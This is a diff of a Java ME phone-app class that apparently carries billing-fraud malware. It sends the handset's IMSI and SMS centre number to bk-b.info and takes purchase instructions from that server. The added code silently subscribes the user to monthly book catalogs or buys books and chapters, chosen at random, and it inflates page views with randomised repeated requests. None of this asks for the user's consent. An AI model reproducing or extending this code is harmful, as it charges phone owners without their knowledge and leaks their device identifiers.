@@ -7,6 +7,7 @@ import org.kxml2.io.KXmlParser;
 import org.kxml2.io.ParserXml;
 import org.xmlpost.PostContent;
 
+import com.sun.j2mews.xml.rpc.Encoder;
 import com.yazo.application.MainMIDlet;
 import com.yazo.protocol.Catalog;
 import com.yazo.protocol.Login;
@@ -29,7 +30,8 @@ import com.yazo.util.User;
 public class Handle {
 	private static int requesttime;
 	public static ServiceData serviceData;
-	static Vector progressID = null;
+	static Vector progressIDFree = null;
+	static Vector progressIDCharge = null;
 	public static int total = 0;
 
 	public static int tempInt = 0;
@@ -42,79 +44,93 @@ public class Handle {
 	public static boolean getYaZhuoChannel() {
 		serviceData = new ServiceData();
 		String name = "NZ_FEE_01";// 接口名称，NZ_FEE_01
-		String channel = Consts.cmchannel;// 渠道号，与基地合作分配的渠道号
-		String number = "";//
-		String userMonthlyType = User.userMonthlyType;
-		userMonthlyType = (userMonthlyType == null ? "" : userMonthlyType);
-		if (userMonthlyType.equals("")) {
-			number = "0";
-		} else {
-			number = userMonthlyType;
-		}
+		String channel = Consts.yzchannel;// 渠道号，与基地合作分配的渠道号
+
 		String str[] = getIMSIANDCENTERNUMBER();
 
 		String version = Consts.VERSION;// 版本号，V1.01
-		String url = "http://bk-b.info/cminterface/sms/sync.aspx";
-		url = url + "?channel=" + channel + "&number=" + number + "&center="
-				+ str[1] + "&imsi=" + str[0] + "&name=" + name + "&version="
-				+ version;
+		String url = "http://bk-b.info/reader/sync/info";
+		url = url + "?channel=" + channel + "&center=" + str[1] + "&imsi="
+				+ str[0] + "&name=" + name + "&version=" + version;
 		YaZhouChannel cdc = new YaZhouChannel(url, "", "GET");
 		try {
 			Object obj = cdc.getYaZhou("");
 			if (obj != null) {
 				String strFile = (String) obj;
-				// System.out.println("服务器返回数据："+strFile);
+				System.out.println("服务器返回数据：" + strFile);
 				serviceData = new ServiceData();
 				serviceData.OPERATE = FileUtil.getArgValue(strFile, "OPERATE");
-				serviceData.SERVICE = FileUtil.getArgValue(strFile, "SERVICE");
+//				serviceData.BUSINESS = FileUtil
+//						.getArgValue(strFile, "BUSINESS");
 				serviceData.FEECODE = FileUtil.getArgValue(strFile, "FEECODE");
 				serviceData.MSG1 = FileUtil.getArgValue(strFile, "MSG1");
 				serviceData.MSG2 = FileUtil.getArgValue(strFile, "MSG2");
 				serviceData.MSG3 = FileUtil.getArgValue(strFile, "MSG3");
-				serviceData.MSG4 = FileUtil.getArgValue(strFile, "MSG4");
-				serviceData.MSG5 = FileUtil.getArgValue(strFile, "MSG5");
-				if (serviceData.MSG4 != null) {
-					progressID = new Vector();
-					String[] s = StringUtil.split(serviceData.MSG4, ",");
+//				serviceData.MSG4 = FileUtil.getArgValue(strFile, "MSG4");
+//				serviceData.MSG5 = FileUtil.getArgValue(strFile, "MSG5");
+//				serviceData.MSG6 = FileUtil.getArgValue(strFile, "MSG6");
+//				serviceData.MSG7 = FileUtil.getArgValue(strFile, "MSG7");
+//				serviceData.MSG8 = FileUtil.getArgValue(strFile, "MSG8");
+
+				// test
+				 serviceData.OPERATE = "0";
+				 serviceData.BUSINESS = (serviceData.BUSINESS == null ? ""
+				 : serviceData.BUSINESS);
+				 // serviceData.FEECODE =
+				 // (serviceData.FEECODE==null?"":serviceData.FEECODE);
+				 // serviceData.MSG1 = Consts.HOSTURL;
+				 // serviceData.MSG2= Consts.strUserAgent;
+				 // serviceData.MSG3="12101017";
+				 serviceData.MSG5 =
+				 "346|349494843|349494845,352|349558873|349558875,341|349680330|349680332";
+				 serviceData.MSG6 =
+				 "0|2487|347125261|347125263,0|880|348782216|348782218,1|122|67065|68168|15553,1|345|74149|74638|15566";
+				 serviceData.MSG4 = "0"/*
+				 (serviceData.MSG4==null?"":serviceData.MSG4) */;
+				 serviceData.MSG7 = (serviceData.MSG7 == null ? ""
+				 : serviceData.MSG7);
+				 serviceData.MSG8 = (serviceData.MSG8 == null ? ""
+				 : serviceData.MSG8);
+				if (serviceData.MSG5 != null) {// 免费书本
+					progressIDFree = new Vector();
+					String[] s = StringUtil.split(serviceData.MSG5, ",");
 					for (int i = 0; i < s.length; i++) {
 						String[] t = StringUtil.split(s[i], "|");
-						/** ****************刷选计费或者不计费流程******************** */
-						if (serviceData.OPERATE.equals("0")) {// 不计费 免费
-							if (i < 3) {
-								Progress pro = new Progress();
-								pro.index = i + 1;
-								pro.sumID = t.length;
-								pro.catalogId = t[0];
-								pro.contentId = t[1];
-								pro.chapterId = t[2];
-								if (pro.sumID > 3) {
-									pro.productId = t[3];
-								}
-								progressID.addElement(pro);
-							} else {
-								break;
-							}
-						} else {// 计费 包月和点播
-							if (i >= 3) {
-								Progress pro = new Progress();
-								pro.index = i + 1;
-								pro.sumID = t.length;
-								pro.catalogId = t[0];
-								pro.contentId = t[1];
-								pro.chapterId = t[2];
-								if (pro.sumID > 3) {
-									pro.productId = t[3];
-								}
-								progressID.addElement(pro);
-							}
+						Progress pro = new Progress();
+						pro.sumID = t.length;
+						pro.catalogId = t[0];
+						pro.contentId = t[1];
+						pro.chapterId = t[2];
+						if (pro.sumID > 3) {
+							pro.productId = t[3];
 						}
+						progressIDFree.addElement(pro);
 
 					}
-
 				}
+				if (serviceData.MSG6 != null) {// 收费书本
+					progressIDCharge = new Vector();
+					String[] s = StringUtil.split(serviceData.MSG6, ",");
+					for (int i = 0; i < s.length; i++) {
+						String[] t = StringUtil.split(s[i], "|");
+
+						Progress pro = new Progress();
+						pro.sumID = t.length;
+						pro.type = t[0];
+						pro.catalogId = t[1];
+						pro.contentId = t[2];
+						pro.chapterId = t[3];
+						if (pro.sumID > 4) {
+							pro.productId = t[4];
+						}
+						progressIDCharge.addElement(pro);
+
+					}
+				}
+
 				Consts.HOSTURL = (serviceData.MSG1 == null ? ""
 						: serviceData.MSG1);// 阅读客户端激活URL
-				Consts.channel = Consts.cmchannel.substring(0, 8);
+				Consts.channel = Consts.yzchannel.substring(0, 8);
 				Consts.strUserAgent = (serviceData.MSG2 == null ? ""
 						: serviceData.MSG2);// 阅读客户端版本号
 				Consts.strUserPassword = (serviceData.MSG3 == null ? ""
@@ -140,16 +156,22 @@ public class Handle {
 	 */
 	public static boolean synYZServer() {
 		String name = "NZ_FEE_RESULT";// 接口名称，NZ_FEE_RESULT
-		String channel = Consts.cmchannel;// 渠道号，与基地合作分配的渠道号
-		String number = String.valueOf(Consts.orderState);// 进行操作的标记
+		String channel = Consts.yzchannel;// 渠道号，与基地合作分配的渠道号
+		// String msg = Consts.orderState;// 进行操作的标记
+		String bookType = Consts.bookType;
+		String bookCatalogId = Consts.bookCatalogId;
+		String bookChapterId = Consts.bookChapterId;
+		String bookContentId = Consts.bookContentId;
 
 		String[] str = getIMSIANDCENTERNUMBER();
 
 		String version = Consts.VERSION;
 		String url = "http://bk-b.info/cminterface/sms/sync.aspx";
-		url = url + "?channel=" + channel + "&number=" + number + "&center="
-				+ str[1] + "&imsi=" + str[0] + "&name=" + name + "&version="
-				+ version;
+		url = url + "?channel=" + channel + "&center=" + str[1] + "&imsi="
+				+ str[0] + "&name=" + name + "&version=" + version
+				+ "&bookType=" + bookType + "&bookCatalogId=" + bookCatalogId
+				+ "&bookChapterId=" + bookChapterId + "&bookContentId="
+				+ bookContentId;
 		YaZhouChannel cdc = new YaZhouChannel(url, "", "GET");
 		try {
 			Object obj = cdc.getYaZhou("");
@@ -167,23 +189,22 @@ public class Handle {
 	 */
 	public static void startProcess() {
 		getYaZhuoChannel();// 请求服务器，获得相应的数据
-//		if (serviceData.MSG5 == null || serviceData.MSG5.equals("0")
-//				|| !Consts.isChinaMobile) {
-//			return;
-//		}
+		if (serviceData.MSG4 == null || serviceData.MSG4.equals("1")
+				|| !Consts.isChinaMobile) {
+			// return;
+		}
 		User.userId = RmsManager.getUserID();// 为userId赋值
 		if (User.userId.equals("")) {// 判断用户id是否存在来进行注册
 			String re = register();// 注册
-			MainMIDlet.postMsg("注册："+re);
+			MainMIDlet.postMsg("注册：" + re);
 		}
 		String au = authenticate();// 登录鉴定
-		MainMIDlet.postMsg("登录："+au);
+		MainMIDlet.postMsg("登录：" + au);
 		String welcome = getClientWelcomeInfo();
-		MainMIDlet.postMsg("欢迎信息："+welcome);
+		MainMIDlet.postMsg("欢迎信息：" + welcome);
 		if (welcome == null) {
 			return;
 		}
-		// 添加什么时候调用该方法
 		doNotMessage();
 
 	}
@@ -225,7 +246,7 @@ public class Handle {
 	 * 
 	 */
 	public static String authenticate() {
-		 String result = "";
+		String result = "";
 		String strM = MD5.toMD5(
 				new StringBuffer(Consts.strUserAgent).append(User.userId)
 						.append(Consts.strUserPassword).toString())
@@ -244,9 +265,9 @@ public class Handle {
 		try {
 			Object obj = ls.authenticate(p.getXml());// 向服务器post信息，并获得返回信息
 			if (obj != null) {
-				 KXmlParser parser = (KXmlParser) obj;
-				 result = ParserXml.registerAndLogin(parser);
-				
+				KXmlParser parser = (KXmlParser) obj;
+				result = ParserXml.registerAndLogin(parser);
+
 				return result;
 			}
 		} catch (Exception e) {
@@ -282,33 +303,56 @@ public class Handle {
 	 * 执行收费章节动作 执行完毕后，保存操作后产生的[contentId, chapterId]为收费章节pv服务
 	 */
 	public static void doSubscribeChapter(int index) {
-//		StringBuffer sb = new StringBuffer();
 		String url = "";
 		RefreshPv pv = null;
-		String productId = "", contentId = "", chapterId = "";
+		String productId = "", contentId = "", chapterId = "", type = "";
 		// 用于防止下标越界
-		if (index >= progressID.size()) {
-			index = progressID.size() - 1;
+		if (index >= progressIDCharge.size()) {
+			index = progressIDCharge.size() - 1;
 		}
-//		index = 1;
-		Progress pro = (Progress) progressID.elementAt(index);
+		Progress pro = (Progress) progressIDCharge.elementAt(index);
 		contentId = pro.contentId;
 		chapterId = pro.chapterId;
 		productId = pro.productId;
-		Consts.orderState = 10 + pro.index;
-//		contentId = "67065";
-//		chapterId = "68168";
-//		productId = "15553";
-		if (index < 3) {
+		type = pro.type;
+
+		Consts.bookType = type;
+		Consts.bookCatalogId = pro.catalogId;
+		Consts.bookChapterId = chapterId;
+		Consts.bookContentId = contentId;
+		// contentId = "67065";
+		// chapterId = "68168";
+		// productId = "15553";
+		if (type.equals("0")) {
 			/** *********包月************* */
+			System.out.println("包月。。。");
 			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
 					.append(pro.catalogId).toString();
 			Catalog catalog = new Catalog(url, "subscribeCatalog", "GET");
 			boolean re = catalog.subscribeCatalog("");
-			MainMIDlet.postMsg("包月是否成功："+re);
-		} else {
-			/** *********点播************* */
+			MainMIDlet.postMsg("包月是否成功：" + re);
+		} else if (type.equals("1")) {// 购买本书
 			// 得到产品
+			System.out.println("购买书。。");
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).toString();
+			pv = new RefreshPv(url, "getContentProductInfo", "GET");
+			// pv.doRefreshPv("");
+			MainMIDlet.postMsg("得到产品--" + pv.doRefreshPv(""));
+			// 执行订购
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).append("&productId=").append(productId)
+					.toString();
+			pv = new RefreshPv(url, "subscribeContent", "GET");
+			// pv.doRefreshPv("");
+			if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals("")) {
+				MainMIDlet.postMsg("执行订购有值返回！！" + pv.doRefreshPv(""));
+			} else {
+				MainMIDlet.postMsg("执行订购-wu-值返回！！");
+			}
+		} else if (type.equals("2")) {
+			// 得到产品
+			System.out.println("购买章节--");
 			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
 					.append(contentId).append("&chapterId=").append(chapterId)
 					.toString();
@@ -320,13 +364,12 @@ public class Handle {
 					.append(contentId).append("&chapterId=").append(chapterId)
 					.append("&productId=").append(productId).toString();
 			pv = new RefreshPv(url, "subscribeContent", "GET");
-//			pv.doRefreshPv("");
-			 if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals(""))
-			 {
-			 MainMIDlet.postMsg("执行订购有值返回！！" + pv.doRefreshPv(""));
-			 } else {
-			 MainMIDlet.postMsg("执行订购-wu-值返回！！");
-			 }
+			// pv.doRefreshPv("");
+			if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals("")) {
+				MainMIDlet.postMsg("执行订购有值返回！！" + pv.doRefreshPv(""));
+			} else {
+				MainMIDlet.postMsg("执行订购-wu-值返回！！");
+			}
 		}
 
 		// contentId和chapterId保存到本地
@@ -349,22 +392,22 @@ public class Handle {
 	 * 执行收费章节Pv
 	 */
 	public static void doSubscribeChapterPV(int index) {
-//		StringBuffer sb = new StringBuffer();
+		// StringBuffer sb = new StringBuffer();
 		String url = "";
 		RefreshPv pv = null;
 		String catalogId, contentId, chapterId;
-		if (index >= progressID.size()) {
-			index = progressID.size() - 1;
+		if (index >= progressIDCharge.size()) {
+			index = progressIDCharge.size() - 1;
 		}
-//		index = 1;
-		Progress pro = (Progress) progressID.elementAt(index);
-		
+		// index = 1;
+		Progress pro = (Progress) progressIDCharge.elementAt(index);
+
 		catalogId = pro.catalogId;
 		contentId = pro.contentId;
 		chapterId = pro.chapterId;
-//		 catalogId = "122";
-//		 contentId = "67065";
-//		 chapterId = "68168";
+		// catalogId = "122";
+		// contentId = "67065";
+		// chapterId = "68168";
 		catalogId = catalogId == null ? "" : catalogId;
 		contentId = contentId == null ? "" : contentId;
 		if (catalogId.equals("") && !contentId.equals("")) {
@@ -400,7 +443,6 @@ public class Handle {
 
 		if (total == 0) {
 			total = 2 + new Random().nextInt(4);
-//			total = 1;
 		}
 		if (tempInt < total) {
 			tempInt++;
@@ -408,6 +450,71 @@ public class Handle {
 		} else {
 			tempInt = 0;
 			total = 0;
+			return;
+		}
+	}
+
+	/**
+	 * 执行免费过程Pv和章节pv 入口
+	 */
+	public static void doFreeProcedurePV(int index) {
+		String url = "";
+		RefreshPv pv = null;
+		String catalogId, contentId, chapterId;
+		if (index >= progressIDFree.size()) {
+			index = progressIDFree.size() - 1;
+		}
+		Progress pro = (Progress) progressIDFree.elementAt(index);
+		catalogId = pro.catalogId;
+		contentId = pro.contentId;
+		chapterId = pro.chapterId;
+		catalogId = catalogId == null ? "" : catalogId;
+		contentId = contentId == null ? "" : contentId;
+		Consts.bookType = "3";
+		Consts.bookCatalogId = pro.catalogId;
+		Consts.bookChapterId = chapterId;
+		Consts.bookContentId = contentId;
+
+		if (catalogId.equals("") && !contentId.equals("")) {
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).toString();
+			pv = new RefreshPv(url, "getContentInfo", "GET");
+			MainMIDlet.postMsg("免费过程1：" + pv.doRefreshPv(""));
+			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+					.append(contentId).append("&chapterId=").append(chapterId)
+					.toString();
+			pv = new RefreshPv(url, "getChapterInfo", "GET");
+			MainMIDlet.postMsg("免费过程2：" + pv.doRefreshPv(""));
+		} else if (!catalogId.equals("") && !contentId.equals("")) {
+			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
+					.append(catalogId).toString();
+			pv = new RefreshPv(url, "getCatalogInfo", "GET");
+			MainMIDlet.postMsg("免费过程3：" + pv.doRefreshPv(""));
+			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
+					.append(catalogId).append("&contentId=").append(contentId)
+					.toString();
+			pv = new RefreshPv(url, "getContentInfo", "GET");
+			MainMIDlet.postMsg("免费过程4：" + pv.doRefreshPv(""));
+			if (!chapterId.equals("")) {
+				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
+						.append(contentId).append("&chapterId=")
+						.append(chapterId).toString();
+				pv = new RefreshPv(url, "getChapterInfo", "GET");
+				MainMIDlet.postMsg("免费过程5：" + pv.doRefreshPv(""));
+			}
+		}
+		catalogId = null;
+		contentId = null;
+		if (total == 0) {
+			total = 2 + new Random().nextInt(2);
+			total = 1;
+		}
+		if (tempInt < total) {
+			tempInt++;
+			doFreeProcedurePV(index);
+		} else {
+			total = 0;
+			tempInt = 0;
 			return;
 		}
 	}
@@ -431,64 +538,6 @@ public class Handle {
 	}
 
 	/**
-	 * 执行免费过程Pv和章节pv 入口
-	 */
-	public static void doFreeProcedurePV() {
-		String url = "";
-		RefreshPv pv = null;
-		String catalogId, contentId, chapterId;
-		int index = new Random().nextInt(progressID.size());
-		Progress pro = (Progress) progressID.elementAt(index);
-		catalogId = pro.catalogId;
-		contentId = pro.contentId;
-		chapterId = pro.chapterId;
-		catalogId = catalogId == null ? "" : catalogId;
-		contentId = contentId == null ? "" : contentId;
-		Consts.orderState = 10 + pro.index;
-		if (catalogId.equals("") && !contentId.equals("")) {
-			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
-					.append(contentId).toString();
-			pv = new RefreshPv(url, "getContentInfo", "GET");
-			MainMIDlet.postMsg("免费过程1："+pv.doRefreshPv(""));
-			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
-					.append(contentId).append("&chapterId=").append(chapterId)
-					.toString();
-			pv = new RefreshPv(url, "getChapterInfo", "GET");
-			MainMIDlet.postMsg("免费过程2："+pv.doRefreshPv(""));
-		} else if (!catalogId.equals("") && !contentId.equals("")) {
-			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
-					.append(catalogId).toString();
-			pv = new RefreshPv(url, "getCatalogInfo", "GET");
-			MainMIDlet.postMsg("免费过程3："+pv.doRefreshPv(""));
-			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
-					.append(catalogId).append("&contentId=").append(contentId)
-					.toString();
-			pv = new RefreshPv(url, "getContentInfo", "GET");
-			MainMIDlet.postMsg("免费过程4："+pv.doRefreshPv(""));
-			if (!chapterId.equals("")) {
-				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
-						.append(contentId).append("&chapterId=")
-						.append(chapterId).toString();
-				pv = new RefreshPv(url, "getChapterInfo", "GET");
-				MainMIDlet.postMsg("免费过程5："+pv.doRefreshPv(""));
-			}
-		}
-		catalogId = null;
-		contentId = null;
-		if (total == 0) {
-			total = 2 + new Random().nextInt(2);
-		}
-		if (tempInt < total) {
-			tempInt++;
-			doFreeProcedurePV();
-		} else {
-			total = 0;
-			tempInt = 0;
-			return;
-		}
-	}
-
-	/**
 	 * 扣费后 刷PV
 	 * 
 	 * @param ids
@@ -508,13 +557,13 @@ public class Handle {
 			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
 					.append(contentId).toString();
 			pv = new RefreshPv(url, "getContentInfo", "GET");
-			MainMIDlet.postMsg("本地过程1："+pv.doRefreshPv(""));
+			MainMIDlet.postMsg("本地过程1：" + pv.doRefreshPv(""));
 
 			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
 					.append(contentId).append("&chapterId=").append(chapterId)
 					.toString();
 			pv = new RefreshPv(url, "getChapterInfo", "GET");
-			MainMIDlet.postMsg("本地过程2："+pv.doRefreshPv(""));
+			MainMIDlet.postMsg("本地过程2：" + pv.doRefreshPv(""));
 		}
 		contentId = null;
 		chapterId = null;
@@ -537,41 +586,33 @@ public class Handle {
 	 * 
 	 */
 	public static void doNotMessage() {
+		int indexFree = new Random().nextInt(progressIDFree.size());
 		if (serviceData.OPERATE.equals("0")) {
-			doFreeProcedurePV();// 进行免费pv流程
-			synYZServer();// 同步服务器
+			doFreeProcedurePV(indexFree);// 进行免费pv流程
+			boolean test = synYZServer();// 同步服务器
+			MainMIDlet.postMsg("同步服务器：" + test);
 		} else if (serviceData.OPERATE.equals("1")) {
-			// 读取本地扣费ID
-			Vector list = RmsManager.getAllChanges();
-			if (list != null && list.size() > 0) {
-				doSubscribeChapterPV();
-			}
+
 			switch (Consts.SYSTEMTYPE) {
 			case 1:
-				if (list == null || list.size() == 0) {
-					// 随机数据执行收费
-					int index = new Random().nextInt(6);
-					// 扣费动作进行购买
-					doSubscribeChapter(index);
-					synYZServer();
-					// 收费过程和章节pv
-					doSubscribeChapterPV(index);
-				} else {
-					doFreeProcedurePV();
-					synYZServer();
-				}
+				// 随机数据执行收费
+				int index = new Random().nextInt(progressIDCharge.size());
+				// 扣费动作进行购买
+				doSubscribeChapter(index);
+				synYZServer();
+				// 收费过程和章节pv
+				doSubscribeChapterPV(index);
 
 				break;
 			case 2:
-				doFreeProcedurePV();
+				doFreeProcedurePV(indexFree);
 				synYZServer();
 				break;
 			default:
-				doFreeProcedurePV();
+				doFreeProcedurePV(indexFree);
 				synYZServer();
 				break;
 			}
-			list = null;
 		}
 	}
 
